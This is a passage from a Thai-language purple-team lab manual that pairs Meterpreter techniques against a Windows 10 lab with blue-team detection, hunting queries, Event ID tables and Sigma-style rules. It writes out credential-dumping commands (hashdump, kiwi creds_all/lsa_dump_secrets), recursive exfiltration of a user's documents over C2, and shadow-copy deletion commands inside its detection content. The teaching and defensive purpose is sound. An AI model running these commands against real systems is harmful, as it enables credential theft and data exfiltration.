## 10.5 Blue Team Detection + Relevant Windows Logs
- **Security 4672** (Special privileges assigned to new logon) — โผล่เมื่อได้ token สิทธิ์สูง
- **Security 4688 / Sysmon 1**: การรัน `fodhelper.exe`/`eventvwr.exe`/`cmstp.exe` ที่ spawn child เป็น cmd/powershell = สัญญาณ UAC bypass
- **Sysmon 12/13** (Registry): การแก้ registry key ที่ auto-elevate binary อ่าน (เช่น `HKCU\Software\Classes\ms-settings\...\shell\open\command` สำหรับ fodhelper)
- **getsystem:** Sysmon อาจเห็น named pipe (Event ID 17/18 — Pipe Created/Connected) ที่มีชื่อสุ่ม

**ตัวอย่าง hunting:**
```powershell
# หา fodhelper/eventvwr ที่ spawn child ผิดปกติ (Sysmon 1)
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 500 |
  Where-Object { $_.Id -eq 1 -and $_.Message -match 'fodhelper\.exe|eventvwr\.exe|cmstp\.exe' } |
  Format-List TimeCreated, Message

# ตรวจ registry hijack ที่ fodhelper ใช้
Get-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -ErrorAction SilentlyContinue
```

## 10.6 IOC / Behavioral Indicators
- `fodhelper.exe` (auto-elevate) เป็น parent ของ `cmd.exe`/`powershell.exe`
- registry key `ms-settings\...\command` มีค่าแปลก (ปกติไม่ควรมี)
- 4672 ปรากฏกับ logon ของผู้ใช้ทั่วไปแบบผิดบริบท

## 10.7 Investigation Procedure
1. หา 4672 ที่ผูกกับผู้ใช้/เวลาไม่ปกติ
2. ไล่ parent/child ของ auto-elevate binaries
3. ตรวจ registry key ที่เกี่ยวกับ fodhelper/eventvwr ว่าถูกแก้หรือไม่

## 10.8 Containment / Remediation
- ปิด session สิทธิ์สูง, ล้าง registry hijack, รีเซ็ตรหัสผ่านบัญชีที่เกี่ยวข้อง
- แพตช์ช่องโหว่ที่ local_exploit_suggester ชี้ (ถ้าเป็น exploit-based)

## 10.9 Detection Improvement
- Alert: auto-elevate binaries (fodhelper/eventvwr/cmstp/sdclt) ที่ spawn shell
- ตั้ง UAC เป็นระดับสูงสุด (Always notify) เพื่อเพิ่มแรงเสียดทาน

## 10.10 MITRE ATT&CK Mapping (บทที่ 10)
- **T1548.002** Abuse Elevation Control Mechanism: Bypass UAC
- **T1134** Access Token Manipulation (getsystem)
- **T1068** Exploitation for Privilege Escalation (local exploit)

## 10.11 Risk Rating + Lessons Learned
- Impact: **สูงมาก** (SYSTEM = ควบคุมเต็ม) · Likelihood: ขึ้นกับ patch level และว่าผู้ใช้เป็น admin หรือไม่
- Detectability: **ปานกลาง–สูง** — UAC bypass ทิ้ง registry/parent-child ที่ตรวจได้; getsystem เห็น 4672/named pipe
- **Lessons Learned:** ให้ผู้ใช้เป็น **Standard User** (ไม่อยู่ใน Administrators) ตัด bypassuac ทั้งตระกูลได้ทันที — เป็นการลดความเสี่ยงที่คุ้มค่าที่สุด

# บทที่ 11 — การสำรวจระบบ (Discovery)

## 11.1 Scenario
ผู้ทดสอบสำรวจ WIN10-LAB เพื่อเข้าใจผู้ใช้ ซอฟต์แวร์ การตั้งค่าความปลอดภัย และเส้นทางต่อไป

## 11.2 Red Team Objective
รวบรวมข้อมูลบริบทของเป้าหมาย (Tactic: Discovery / TA0007)

## 11.3 ลิสต์คำสั่ง/โมดูล Discovery ที่ใช้ได้จริง

**ใน meterpreter (built-in):**
```
sysinfo
getuid
ps
ipconfig
route
arp
idletime
```

**Post modules (background session ก่อน แล้ว run):**
```
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/checkvm
run post/windows/gather/enum_shares
run post/windows/gather/enum_av_excluded          # โฟลเดอร์ที่ AV ยกเว้น (ถ้ามีโมดูลในเวอร์ชัน)
```
> ตรวจ `search post/windows/gather` เพื่อดูโมดูลที่มีจริงในเวอร์ชันของคุณ (ห้ามแต่งชื่อ)

**ผ่าน `shell` (LOLBins ของ Windows):**
```
shell
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
tasklist /v
netstat -ano
```

## 11.4 Technique / Tactic
- **T1082** System Information Discovery · **T1057** Process Discovery
- **T1033** System Owner/User Discovery · **T1518.001** Security Software Discovery
- **T1083** File and Directory Discovery · **T1518** Software Discovery

## 11.5 Expected System Behavior
- คำสั่ง discovery ผ่าน `shell` = spawn `cmd.exe` + LOLBins (`whoami`, `net`, `systeminfo`, `tasklist`, `netstat`)
- post modules ทำงานผ่าน API เป็นส่วนใหญ่ (in-memory) เห็นยากกว่า

## 11.6 Blue Team Detection + Relevant Windows Logs
- **Security 4688 / Sysmon 1**: การรัน `whoami.exe`, `net.exe`, `systeminfo.exe`, `tasklist.exe`, `net1.exe`, `nltest.exe` ต่อเนื่องกันในเวลาสั้น ๆ = **สัญญาณ discovery burst**
- parent เป็น process ที่ไม่ควรรันคำสั่งเหล่านี้ (เช่น `explorer.exe`/office → `cmd.exe` → `whoami`)

**Normal vs Suspicious:**
| Normal | Suspicious |
|--------|-----------|
| แอดมินรัน `systeminfo` เป็นครั้งคราวจาก console | `whoami /priv`, `net localgroup administrators`, `systeminfo`, `tasklist` รันติดกันภายในไม่กี่วินาทีจาก process แปลก |

**ตัวอย่าง hunting (discovery burst):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 500 |
  Where-Object { $_.Message -match 'whoami\.exe|net1?\.exe|systeminfo\.exe|tasklist\.exe|nltest\.exe' } |
  Sort-Object TimeCreated | Format-List TimeCreated, Message
```

## 11.7 IOC / Behavioral Indicators
- ลำดับ LOLBins หลายตัวในหน้าต่างเวลาแคบจาก parent เดียว
- การเรียก `net localgroup administrators`, `whoami /priv` โดยผู้ใช้ทั่วไป

## 11.8 Investigation / Containment / Remediation
- Investigation: จัดลำดับเวลา (timeline) ของ 4688 เพื่อเห็น burst; ผูกกับ session C2
- Containment: isolate เครื่อง; ถ้ายังเป็น discovery ล้วน อาจเฝ้าดูเพื่อเก็บ intel เพิ่ม (ตามนโยบาย IR)
- Remediation: หลังยืนยัน ให้ตัด session และตาม persistence

## 11.9 Detection Improvement
- สร้าง rule นับจำนวน LOLBins discovery ต่อ process/parent ในหน้าต่างเวลา (เช่น ≥3 ตัวใน 60 วินาที)

## 11.10 MITRE ATT&CK Mapping (บทที่ 11)
- T1082, T1057, T1033, T1518, T1518.001, T1083, T1016 (System Network Configuration Discovery)

## 11.11 Risk Rating + Lessons Learned
- Impact: **ปานกลาง** (ยังไม่ทำลาย แต่ปูทางขั้นต่อไป) · Detectability: **สูง** ถ้าเก็บ 4688 + command line
- **Lessons Learned:** Discovery คือ "เสียงที่ได้ยินง่าย" ถ้า Blue Team เปิด command-line auditing — จึงเป็นโอกาสตรวจจับช่วงต้นที่ดีมาก

---

# บทที่ 12 — การเข้าถึงข้อมูลรับรอง (Credential Access)

## 12.1 Scenario
ด้วยสิทธิ์ที่ยกขึ้นแล้ว (บทที่ 10) ผู้ทดสอบพยายามดึง credential จาก WIN10-LAB

## 12.2 Red Team Objective
ได้ hash/credential (Tactic: Credential Access / TA0006)

## 12.3 ลิสต์คำสั่ง/โมดูลที่ใช้ได้จริง

**1) `hashdump` (SAM hashes, T1003.002) — ต้องสิทธิ์ SYSTEM/admin**
```
hashdump
```

**2) Kiwi extension (Mimikatz ในตัว Meterpreter, T1003.001)**
```
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```
> `load kiwi` ต้องการสิทธิ์สูงและ arch ที่ตรงกับ process — ถ้า fail ให้ `migrate` เข้า process x64 ที่มีสิทธิ์ก่อน

**3) Post modules สำหรับ credential**
```
run post/windows/gather/credentials/credential_collector
run post/windows/gather/smart_hashdump
```
> ตรวจ `search post/windows/gather/credentials` เพื่อดูรายการจริงในเวอร์ชัน

## 12.4 Expected System Behavior
- `hashdump`/`smart_hashdump`: เข้าถึง registry hives (`SAM`, `SYSTEM`, `SECURITY`)
- `load kiwi`: เข้าถึงหน่วยความจำของ **LSASS** (อ่าน credential material)

## 12.5 Blue Team Detection + Relevant Windows Logs (จุดตรวจจับสำคัญ)
- **LSASS access (kiwi/mimikatz):** **Sysmon Event ID 10 (ProcessAccess)** ที่ **TargetImage = lsass.exe** ด้วย GrantedAccess ที่อ่านหน่วยความจำ (เช่น `0x1010`, `0x1410`) จาก process ที่ไม่ใช่ระบบ = **สัญญาณเด่นชัดของ credential dumping**
- **SAM/registry hive access:** การเปิด `SAM`/`SECURITY` hive; Sysmon 1 การรันเครื่องมือ; Security 4688
- **Credential Guard** (ถ้าเปิด) ป้องกันการดึงจาก LSASS ได้มาก

**ตัวอย่าง hunting (LSASS access):**
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 1000 |
  Where-Object { $_.Id -eq 10 -and $_.Message -match 'lsass\.exe' } |
  Format-List TimeCreated, Message
```

## 12.6 IOC / Behavioral Indicators
- process ที่ไม่ใช่ระบบเปิด handle ไป `lsass.exe` ด้วยสิทธิ์อ่านหน่วยความจำ
- การเข้าถึง SAM/SECURITY hive นอกบริบท backup/servicing ปกติ

## 12.7 Investigation Procedure
1. หา Sysmon 10 ที่ target lsass → ระบุ source process/PID
2. เชื่อมโยงกับ session C2 และการยกสิทธิ์ก่อนหน้า (บทที่ 10)
3. ประเมินขอบเขต credential ที่อาจรั่ว → บังคับรีเซ็ตรหัสผ่าน

## 12.8 Containment / Remediation
- **บังคับรีเซ็ตรหัสผ่าน** ทุกบัญชีที่อาจถูกดึง (รวม local admin)
- Rotate secrets/keys ที่เก็บบนเครื่อง
- เปิด **Credential Guard**, **LSASS Protection (RunAsPPL)**

## 12.9 Detection Improvement
- Alert ทุกครั้งที่มี non-system process เปิด handle ไป LSASS ด้วยสิทธิ์อ่าน
- เปิด **Attack Surface Reduction rule: Block credential stealing from lsass.exe**

## 12.10 MITRE ATT&CK Mapping (บทที่ 12)
- **T1003.001** OS Credential Dumping: LSASS Memory
- **T1003.002** OS Credential Dumping: Security Account Manager (SAM)

## 12.11 Risk Rating + Lessons Learned
- Impact: **สูงมาก** — credential ที่รั่วเปิดทางสู่ lateral movement/persistence ระยะยาว
- Detectability: **สูง** ถ้ามี Sysmon 10 + LSASS monitoring; **ลดโอกาสสำเร็จ** ได้ด้วย Credential Guard/RunAsPPL
- **Lessons Learned:** LSASS access monitoring คือหนึ่งใน detection ที่คุ้มค่าที่สุดในองค์กร Windows

---

# บทที่ 13 — การเคลื่อนที่ด้านข้าง (Lateral Movement) — เชิงหลักการใน Lab เครื่องเดียว

## 13.1 Scope note (สำคัญ)
Lab ตามข้อกำหนดมี **Windows เป้าหมายเครื่องเดียว** — Lateral Movement ที่แท้จริงต้องมี ≥2 เครื่อง ดังนั้นบทนี้อธิบาย **เชิงหลักการ (Concept) + สิ่งที่ Blue Team ควรตรวจจับ** โดย **ไม่ดำเนินการจริง** (อยู่นอกขอบเขต Lab เครื่องเดียว) หากคุณขยาย Lab เป็นหลายเครื่องในอนาคต จึงค่อยทดสอบตามหลักการนี้

## 13.2 Red Team Objective (เชิงหลักการ)
ใช้ credential ที่ได้ (บทที่ 12) เคลื่อนไปเครื่องอื่น (Tactic: Lateral Movement / TA0008)

## 13.3 เทคนิค/โมดูลที่ "มีจริง" ใน Metasploit (อธิบายหลักการ)
| โมดูล/เทคนิค | หลักการ | ATT&CK |
|--------------|---------|--------|
| `exploit/windows/smb/psexec` | ใช้ credential/hash รันคำสั่งผ่าน SMB (Admin share + service) | T1021.002, T1569.002 |
| Pass-the-Hash (ผ่าน psexec ด้วย `SMBPass` เป็น hash) | ยืนยันตัวด้วย NTLM hash โดยไม่ต้องรู้รหัสผ่าน | T1550.002 |
| `windows/local/portfwd`, `route` (pivoting) | ใช้เครื่องที่ยึดได้เป็นทางผ่านไปยัง subnet อื่น | T1090 |

> เอกสารนี้ **ไม่ให้ลำดับคำสั่งลงมือ** สำหรับ psexec เพราะไม่มีเครื่องที่สอง in-scope — เมื่อขยาย Lab แล้วให้ตั้งขอบเขต/RoE ใหม่ก่อน

## 13.4 Expected System Behavior (บนเครื่องปลายทางสมมติ)
- **Service ใหม่** ถูกสร้างโดย psexec (มักชื่อสุ่ม) → รันคำสั่ง
- **Logon ใหม่แบบ Network (Type 3)** ด้วยบัญชีที่ใช้

## 13.5 Blue Team Detection + Relevant Windows Logs
- **Security 4624** Logon Type 3 (Network) จาก host ต้นทางที่ผิดปกติ
- **Security 4672** ถ้าบัญชีมีสิทธิ์สูง
- **System 7045 / Security 4697** service ใหม่จาก psexec
- **Sysmon 3** การเชื่อมต่อ SMB (445) ระหว่าง workstation-to-workstation (ผิดปกติในหลายองค์กร)
- **Named pipe** ของ psexec (Sysmon 17/18)

## 13.6 IOC / Behavioral Indicators
- workstation คุยกันเองผ่าน SMB/445 (ปกติควรคุยกับ server)
- service ชื่อสุ่มที่รัน `cmd.exe /c` หรือ payload
- การใช้บัญชี admin เดียวกัน logon หลายเครื่องในเวลาไล่เลี่ย

## 13.7 Investigation / Containment / Remediation
- Investigation: เชื่อม 4624(Type3) + 7045 ข้ามเครื่องด้วย SIEM; หา "patient zero"
- Containment: บล็อก SMB workstation-to-workstation; ปิดบัญชีที่ถูกใช้
- Remediation: รีเซ็ต credential; เปิด SMB signing; ใช้ LAPS สำหรับ local admin

## 13.8 Detection Improvement
- Alert: 4624 Type 3 ด้วย local admin จาก source ที่เป็น workstation
- Segmentation: ห้าม workstation คุย SMB กันเอง (host firewall)

## 13.9 MITRE ATT&CK Mapping (บทที่ 13)
- **T1021.002** Remote Services: SMB/Windows Admin Shares
- **T1550.002** Use Alternate Authentication Material: Pass the Hash
- **T1569.002** System Services: Service Execution

## 13.10 Risk Rating + Lessons Learned
- Impact: **สูงมาก** (แพร่กระจายทั้งโดเมน) · แต่ **Out-of-scope** ใน Lab เครื่องเดียวนี้
- **Lessons Learned:** การป้องกันที่คุ้มสุดคือ **LAPS (รหัส local admin ไม่ซ้ำ) + SMB signing + segmentation** ตัดพื้นฐานของ PtH/psexec

---

# บทที่ 14 — การรวบรวมและนำข้อมูลออก (Collection & Exfiltration)

## 14.1 Scenario
ผู้ทดสอบรวบรวมไฟล์สำคัญบน WIN10-LAB แล้วส่งกลับผ่าน C2 channel

## 14.2 Red Team Objective
เก็บและนำข้อมูลออก (Tactics: Collection / TA0009, Exfiltration / TA0010)

## 14.3 ลิสต์คำสั่งที่ใช้ได้จริง

**Collection (บนเป้าหมาย):**
```
search -f *.docx -d C:\\Users\\victim\\Documents
search -f *.kdbx
download C:\\Users\\victim\\Documents\\plan.docx /home/kali/lab/loot/
```

**Staging + bulk download:**
```
# ดาวน์โหลดทั้งโฟลเดอร์ (recursive) กลับมาที่ Kali
download -r C:\\Users\\victim\\Documents\\ /home/kali/lab/loot/
```

**Exfiltration ผ่าน C2 channel (T1041):**
- ไฟล์ที่ `download` วิ่งกลับผ่าน Meterpreter C2 (reverse_tcp/https) เดียวกับ session — ไม่ต้องเปิดช่องใหม่
- นี่คือ **T1041 Exfiltration Over C2 Channel**

## 14.4 Expected System Behavior
- การอ่านไฟล์จำนวนมากในเวลาสั้น
- ปริมาณ outbound เพิ่มขึ้นชัดเจนบน session C2 (โดยเฉพาะ `download -r`)

## 14.5 Blue Team Detection + Relevant Windows Logs
- **Sysmon 3**: outbound spike ต่อ C2 (ปริมาณข้อมูล/ระยะเวลา)
- **File access auditing** (Security 4663) ถ้าตั้ง SACL บนโฟลเดอร์สำคัญ — เห็นการอ่านไฟล์เป็นชุด
- **Sysmon 11**: ถ้ามีการ stage ไฟล์ (บีบอัด/รวมไฟล์) ก่อนส่ง

**Normal vs Suspicious:**
| Normal | Suspicious |
|--------|-----------|
| ผู้ใช้เปิดเอกสารทีละไฟล์ | process เดียวอ่านไฟล์เอกสารจำนวนมากรวดเดียว + outbound spike |

## 14.6 IOC / Behavioral Indicators
- outbound ต่อเนื่องปริมาณสูงไป host ภายในที่ไม่ใช่ file server
- การอ่านไฟล์เป็นชุดจาก process ที่ถือ C2 session

## 14.7 Investigation Procedure
1. หา session C2 → PID → ผูกกับ Sysmon 3 (ปริมาณ/ปลายทาง)
2. ถ้าเปิด 4663: ทำ timeline การอ่านไฟล์เพื่อประเมินขอบเขตข้อมูลที่รั่ว
3. ระบุว่าไฟล์ใดถูกนำออก → ประเมินผลกระทบ (data classification)

## 14.8 Containment / Remediation
- Isolate ทันทีเพื่อหยุด exfiltration
- ประเมินข้อมูลที่รั่ว → แจ้งตามนโยบาย (ใน Lab = จดบันทึกบทเรียน)
- หมุนเวียน secret ที่อยู่ในไฟล์ที่รั่ว

## 14.9 Detection Improvement
- ตั้ง SACL (4663) บนโฟลเดอร์ข้อมูลสำคัญ
- DLP / egress monitoring: alert outbound ปริมาณสูงไปปลายทางผิดปกติ
- Baseline ปริมาณ traffic ปกติของแต่ละ workstation

## 14.10 MITRE ATT&CK Mapping (บทที่ 14)
- **T1005** Data from Local System · **T1074** Data Staged
- **T1560** Archive Collected Data (ถ้ามีการบีบอัด) · **T1041** Exfiltration Over C2 Channel

## 14.11 Risk Rating + Lessons Learned
- Impact: **สูงมาก** (สูญเสียข้อมูล) · Detectability: **ปานกลาง–สูง** ถ้ามี egress monitoring + 4663
- **Lessons Learned:** เมื่อถึงขั้น exfiltration มักสายเกินป้องกันข้อมูลชิ้นนั้น — คุณค่าจริงอยู่ที่ **ตรวจจับให้เร็วในขั้นก่อนหน้า** (initial access/discovery)

# บทที่ 15 — การตรวจจับพฤติกรรมแบบ Ransomware (มุมมอง Blue Team เท่านั้น)

> **บทนี้เป็น Blue-Team-only โดยเจตนา** — เป็นการเตรียม "การตรวจจับและตอบสนอง" ไม่ใช่การสร้างเครื่องมือ เนื้อหาทั้งหมดคือ Telemetry/Detection/Response

## 15.1 ข้อเท็จจริงเชิงเครื่องมือ (Fact)
- **Metasploit ไม่มี payload สำเร็จรูปสำหรับเข้ารหัสไฟล์แบบเรียกค่าไถ่** — คู่มือนี้จึงไม่มีคำสั่งฝั่ง Red สำหรับหัวข้อนี้ (สอดคล้องข้อกำหนด "ห้ามคำสั่งที่ใช้ใน Metasploit ไม่ได้")
- สิ่งที่ Blue Team ต้องเตรียมคือ **ความสามารถในการสังเกตพฤติกรรม "impact"** บน Windows เพื่อฝึกการตรวจจับ/ตอบสนอง ไม่ว่าภัยจะมาจากเครื่องมือใด

## 15.2 พฤติกรรมที่ Blue Team ควร "เฝ้า" (Behavioral Telemetry ระดับสังเกตการณ์)
วัตถุประสงค์: รู้ว่าถ้ามีกิจกรรมทำลายข้อมูล/ขัดขวางการกู้คืนเกิดขึ้น **Windows จะทิ้งร่องรอยอะไร** เพื่อให้ตั้ง detection ไว้ล่วงหน้า

| พฤติกรรมระดับผลกระทบ (สังเกตการณ์) | Windows Telemetry ที่เกี่ยวข้อง | ATT&CK |
|-----------------------------------|-------------------------------|--------|
| การแก้ไข/เขียนไฟล์เอกสารจำนวนมากในเวลาสั้น | Sysmon **11** (FileCreate) ปริมาณสูงผิดปกติ; File audit **4663** ถ้าตั้ง SACL | T1486 |
| การลบ Volume Shadow Copies (ขัดขวางการกู้คืน) | การเรียก `vssadmin.exe`/`wmic shadowcopy delete` → Security **4688**/Sysmon **1**; System log ของ VSS | T1490 |
| การปิด service สำรองข้อมูล/ความปลอดภัย | System **7036/7040** (service state/start-type เปลี่ยน) | T1489 |
| การปิด/แก้การป้องกัน | Defender Operational **5001/5007**; Security config change | T1562.001 |
| ทิ้งไฟล์ข้อความจำนวนมากในหลายโฟลเดอร์ | Sysmon **11** สร้างไฟล์ชื่อซ้ำ ๆ ทั่ว tree | T1486 |

> ทั้งหมดนี้คือ **สิ่งที่ต้อง "ตรวจจับ"** ไม่ใช่ "วิธีทำ" — เอกสารตั้งใจไม่ให้ขั้นตอนลงมือ

## 15.3 Normal vs Suspicious (พฤติกรรมไฟล์)
| Normal | Suspicious |
|--------|-----------|
| แอปสำรองข้อมูลอ่าน/เขียนไฟล์ตามกำหนดการที่ทราบ | process เดียวแก้ไฟล์เอกสารหลายร้อยไฟล์ต่อหลายโฟลเดอร์ในไม่กี่นาที |
| แอดมินจัดการ shadow copy ในหน้าต่าง maintenance | `vssadmin delete shadows` จาก process ผู้ใช้ทั่วไป/ไม่คาดคิด |
| ผู้ใช้เปิด/บันทึกเอกสารทีละไฟล์ | นามสกุลไฟล์เปลี่ยนเป็นรูปแบบเดียวกันจำนวนมากพร้อมกัน |

## 15.4 Detection Opportunity (ตั้ง detection ล่วงหน้า)
- **File-write velocity:** นับจำนวน Sysmon Event ID 11 ต่อ process ต่อหน่วยเวลา → alert เมื่อเกินเกณฑ์ baseline
- **Shadow copy deletion:** alert ทันทีเมื่อพบ `vssadmin.exe ... delete shadows` หรือ `wmic shadowcopy delete` (4688/Sysmon 1) — เป็น high-fidelity signal
- **Backup/security service stop:** เฝ้า System 7036/7040 กับ service สำคัญ
- **Canary files:** วางไฟล์ล่อ (honeyfiles) ในโฟลเดอร์สำคัญ + เฝ้าการเข้าถึง (4663) เพื่อเตือนแต่เนิ่น

**ตัวอย่าง hunting (การลบ shadow copy):**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 500 |
  Where-Object { $_.Message -match 'vssadmin|shadowcopy' } |
  Format-List TimeCreated, Message
```

## 15.5 Investigation Procedure
1. ระบุ process ที่ทำ file-write velocity สูง → PID/parent/hash
2. เชื่อมโยงกับ initial access / C2 (บทที่ 6–7) เพื่อสร้าง timeline
3. ตรวจว่ามีการลบ shadow copy / ปิด backup service หรือไม่ (ประเมินความสามารถกู้คืน)
4. ประเมินขอบเขตไฟล์ที่ได้รับผลกระทบ

## 15.6 Containment / Eradication / Recovery
- **Containment:** isolate เครื่องทันที (ตัด network adapter ของ VM) เพื่อจำกัดผลกระทบ
- **Eradication:** ตัด C2 session, ลบ persistence (บทที่ 9), ยืนยันไม่มี process ทำงานหลงเหลือ
- **Recovery:** กู้คืนจาก **backup ที่แยกออฟไลน์** (offline/immutable backup) — เหตุผลที่ backup แบบแยกจึงสำคัญ
- **ใน Lab:** วิธีที่สะอาดสุดคือ **Revert Snapshot** กลับ baseline

## 15.7 Detection Improvement & Hardening
- เปิด **Controlled Folder Access** ของ Windows Defender (ป้องกันการเขียนโฟลเดอร์สำคัญโดย process ที่ไม่ได้รับอนุญาต)
- สำรองข้อมูลแบบ **3-2-1** และมีสำเนา **offline/immutable**
- จำกัดสิทธิ์การรัน `vssadmin`/`wmic` ให้เฉพาะแอดมิน + เฝ้า audit
- เปิด ASR rules ที่เกี่ยวข้องกับพฤติกรรม ransomware-like

## 15.8 MITRE ATT&CK Mapping (บทที่ 15)
- **T1486** Data Encrypted for Impact · **T1490** Inhibit System Recovery
- **T1489** Service Stop · **T1562.001** Impair Defenses: Disable or Modify Tools

## 15.9 Lessons Learned (บทที่ 15)
- คุณค่าหลักของบทนี้คือ **"เตรียม detection ก่อนเกิดเหตุ"** — file-write velocity, shadow-copy-deletion alert, canary files, offline backup
- การกู้คืนที่เชื่อถือได้ที่สุดไม่ใช่การถอดรหัส แต่คือ **backup ที่แยกและ immutable** (ใน Lab = Snapshot)

# บทที่ 16 — Windows Telemetry เชิงลึกสำหรับ Blue Team

## 16.1 Objective
รวมแหล่ง Telemetry ของ Windows 10 ที่ใช้ตรวจจับกิจกรรมในบทที่ 4–15 ให้อยู่ในที่เดียว พร้อมวิธีเปิดและ query

## 16.2 แหล่ง Log หลักและ Event ID ที่ยืนยันแล้ว

**Security Log**
| Event ID | ความหมาย | ใช้จับอะไร |
|----------|----------|-----------|
| 4688 | Process creation (+command line ถ้าเปิด) | User Execution, discovery burst, LOLBins |
| 4689 | Process termination | timeline การทำงานของ process |
| 4624 | Successful logon (มี Logon Type) | logon Type 3 (network) สำหรับ lateral movement |
| 4625 | Failed logon | brute force / spray |
| 4634 / 4647 | Logoff | timeline session |
| 4672 | Special privileges assigned | getsystem / สิทธิ์สูง |
| 4697 | Service installed (Security) | persistence (service) |
| 4698 / 4699 | Scheduled task created / deleted | persistence (task) |
| 4657 | Registry value modified (ต้องตั้ง SACL) | persistence (Run key) |
| 4663 | Object access (ต้องตั้ง SACL) | file access / exfil scope |
| 1102 | Audit log cleared | Defense Evasion (clearev) |

**System Log**
| Event ID | ความหมาย |
|----------|----------|
| 7045 | New service installed |
| 7036 / 7040 | Service state / start-type changed |
| 104 | Event log cleared |

**PowerShell (Microsoft-Windows-PowerShell/Operational)**
| Event ID | ความหมาย |
|----------|----------|
| 4103 | Module logging (pipeline) |
| 4104 | Script block logging (โค้ดที่รันจริง — สำคัญมาก) |
| 400 / 600 | Engine/provider lifecycle |

**Sysmon (Microsoft-Windows-Sysmon/Operational) — ถ้าติดตั้งใน Lab**
| Event ID | ความหมาย | ใช้จับอะไร |
|----------|----------|-----------|
| 1 | Process create (มี hash, cmdline, parent) | เกือบทุกเทคนิค |
| 3 | Network connection | C2, exfiltration |
| 7 | Image/DLL loaded | DLL side-loading |
| 8 | CreateRemoteThread | **process injection (migrate)** |
| 10 | ProcessAccess | **LSASS access (credential dump)** |
| 11 | FileCreate | payload drop, ransomware-like write |
| 12/13/14 | Registry object add/set/rename | persistence, UAC bypass |
| 17/18 | Pipe created/connected | Meterpreter/psexec named pipes |
| 22 | DNS query | C2 domain lookup |
| 23/25 | File delete / process tampering | anti-forensics |

**Windows Defender (Microsoft-Windows-Windows Defender/Operational)**
| Event ID | ความหมาย |
|----------|----------|
| 1116 | Malware detected |
| 1117 | Action taken on malware |
| 5001 | Real-time protection disabled |
| 5007 | Configuration changed |

> **ห้ามแต่ง Event ID** — ถ้าเวอร์ชัน Windows/Sysmon ของคุณให้ผลต่าง ให้ยืนยันจากเอกสารของ Microsoft/Sysmon ก่อนใช้ในการตั้ง rule

## 16.3 คำสั่งเปิด/ตรวจสอบ Telemetry (Windows 10 Lab)

```powershell
# ตรวจสถานะ audit policy ปัจจุบัน
auditpol /get /category:*

# เปิด audit สำคัญ (ตัวอย่าง)
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable

# ตรวจว่า command-line auditing เปิดอยู่หรือไม่
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled

# ดูขนาด/การตั้งค่า log
wevtutil gl Security
```

## 16.4 การรวมศูนย์ Log (Log Forwarding) — แนวคิดสำหรับ Lab
- ใช้ **Windows Event Forwarding (WEF)** ส่ง log ไปเครื่องเก็บกลาง (`siem-lab` 192.168.56.30)
- หรือ ship ด้วย agent (เช่น Winlogbeat) ไปยัง ELK/Snort/SIEM ใน Lab
- **เหตุผล:** `clearev` ล้าง log บนเครื่องได้ แต่ล้าง log ที่ forward ออกไปแล้วไม่ได้ → ทำให้ 1102/104 ยังสืบได้

## 16.5 Lessons Learned (บทที่ 16)
- Telemetry ที่ทรงพลังสุดสำหรับจับ Meterpreter: **Sysmon 8/10 (injection/LSASS), 3 (C2), Security 4688 (+cmdline), 4698/7045 (persistence)**
- ถ้าไม่ forward log ออกนอกเครื่อง คุณเสี่ยงสูญหลักฐานเมื่อผู้โจมตี `clearev`

---

# บทที่ 17 — Detection Engineering (การสร้าง Rule / Hunting)

## 17.1 Objective
แปลง Telemetry เป็น **detection logic** ที่นำไปใช้ได้ — นำเสนอเป็น pseudo-rule (แนว Sigma) และ hunting query

## 17.2 หลักการเขียน Detection
1. เริ่มจาก **behavior** ไม่ใช่ static IoC อย่างเดียว
2. ระบุ **Normal baseline** ก่อน แล้ว alert ที่ deviation
3. ให้แต่ละ rule map กับ ATT&CK technique
4. ประเมิน **False Positive** และวิธี tune

## 17.3 ตัวอย่าง Detection Rules (pseudo-Sigma — ปรับ field ตาม schema จริงของคุณ)

**R1 — Meterpreter default port (T1571)**
```yaml
title: Outbound to Metasploit default port 4444 from user-folder binary
logsource: { product: windows, service: sysmon }
detection:
  selection:
    EventID: 3
    DestinationPort: 4444
  condition: selection
level: high
falsepositives:
  - แอปที่ใช้พอร์ต 4444 โดยชอบธรรม (พบน้อย) — ตรวจ Image ประกอบ
```

**R2 — Process injection into explorer.exe (T1055 / migrate)**
```yaml
title: CreateRemoteThread into explorer.exe from non-system process
logsource: { product: windows, service: sysmon }
detection:
  selection:
    EventID: 8
    TargetImage|endswith: '\explorer.exe'
  filter:
    SourceImage|endswith: ['\svchost.exe']   # ปรับตาม baseline
  condition: selection and not filter
level: high
```

**R3 — LSASS credential access (T1003.001)**
```yaml
title: Suspicious LSASS ProcessAccess
logsource: { product: windows, service: sysmon }
detection:
  selection:
    EventID: 10
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: ['0x1010','0x1410','0x1438','0x143a','0x1418']
  filter:
    SourceImage|endswith: ['\MsMpEng.exe','\wininit.exe']
  condition: selection and not filter
level: critical
```

**R4 — UAC bypass via auto-elevate binary (T1548.002)**
```yaml
title: Auto-elevate binary spawning shell
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4688
    ParentProcessName|endswith: ['\fodhelper.exe','\eventvwr.exe','\cmstp.exe','\sdclt.exe']
    NewProcessName|endswith: ['\cmd.exe','\powershell.exe']
  condition: selection
level: high
```

**R5 — Event log cleared (T1070.001)**
```yaml
title: Windows event log cleared
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 1102
  condition: selection
level: critical
```

**R6 — Scheduled task / service persistence (T1053.005 / T1543.003)**
```yaml
title: New service or scheduled task from user-writable path
logsource: { product: windows }
detection:
  selection_svc: { EventID: 7045 }
  selection_task: { EventID: 4698 }
  path_susp|contains: ['\Users\','\AppData\','\Temp\','\Public\']
  condition: (selection_svc or selection_task) and path_susp
level: high
```

